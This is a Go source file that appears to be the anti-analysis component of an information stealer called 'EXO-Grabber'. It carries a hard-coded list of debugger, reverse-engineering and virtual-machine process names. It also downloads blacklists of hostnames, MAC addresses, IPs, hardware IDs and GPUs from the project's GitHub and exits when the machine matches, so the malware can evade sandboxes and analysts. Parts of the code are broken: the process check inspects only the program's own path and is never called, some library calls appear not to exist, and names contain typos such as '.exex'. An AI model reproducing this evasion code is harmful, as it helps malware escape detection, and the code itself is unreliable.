package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"

	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/net"
)

var processes = []string{
	"ProcessHacker.exe",
	"httpdebuggerui.exe",
	"wireshark.exe",
	"fiddler.exe",
	"regedit.exe",
	"cmd.exe",
	"taskmgr.exe",
	"vboxservice.exe",
	"df5serv.exe",
	"processhacker.exe",
	"vboxtray.exe",
	"vmtoolsd.exe",
	"vmwaretray.exe",
	"ida64.exe",
	"ollydbg.exe",
	"pestudio.exe",
	"vmwareuser.exe",
	"vgauthservice.exe",
	"vmacthlp.exe",
	"vmsrvc.exe",
	"x32dbg.exe",
	"x64dbg.exe",
	"x96dbg.exe",
	"vmusrvc.exe",
	"prl_cc.exe",
	"prl_tools.exe",
	"qemu-ga.exe",
	"joeboxcontrol.exe",
	"ksdumperclient.exe",
	"xenservice.exe",
	"joeboxserver.exe",
	"devenv.exe",
	"IMMUNITYDEBUGGER.EXE",
	"ImportREC.exe",
	"reshacker.exe",
	"windbg.exe",
	"32dbg.exe",
	"64dbg.exex",
	"protection_id.exex",
	"scylla_x86.exe",
	"scylla_x64.exe",
	"scylla.exe",
	"idau64.exe",
	"idau.exe",
	"idaq64.exe",
	"idaq.exe",
	"idaw.exe",
	"idag64.exe",
	"idag.exe",
	"ida64.exe",
	"ida.exe",
}

func Check() {
    for _, proc := range processes {
        if strings.Contains(strings.ToLower(os.Args[0]), proc) {
            os.Exit(1)
        }
    }
}

func download(url string) ([]string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return strings.Split(string(bytes), "\n"), nil
}

func main() {
	urls := []string{
		"https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/pc_name_list.txt",
		"https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/mac_list.txt",
		"https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/ip_list.txt",
		"https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/hwid_list.txt",
		"https://raw.githubusercontent.com/Syntheticc/EXO-Grabber/main/Utils/devutils/gpu_list.txt",
	}

	ip, _ := net.Interfaces()
	hostInfo, _ := host.Info()

	for _, url := range urls {
		list, err := download(url)
		if err != nil {
			panic(err)
		}

		for _, item := range list {
			if item == "" {
				continue
			}

			for _, addr := range ip {
				if strings.ToLower(addr.HardwareAddr.String()) == strings.ToLower(item) {
					os.Exit(1)
				}

				for _, addr := range addr.Addrs {
					if strings.ToLower(addr.IP.String()) == strings.ToLower(item) {
						os.Exit(1)
					}
				}
			}

			if strings.ToLower(hostInfo.Hostname) == strings.ToLower(item) {
				os.Exit(1)
			}

			if strings.ToLower(hostInfo.HWID) == strings.ToLower(item) {
				os.Exit(1)
			}

			gpus, err := host.GPUs()
			if err == nil {
				for _, gpu := range gpus {
					if strings.ToLower(gpu.Name) == strings.ToLower(item) {
						os.Exit(1)
					}
				}
			}
		}
	}
}

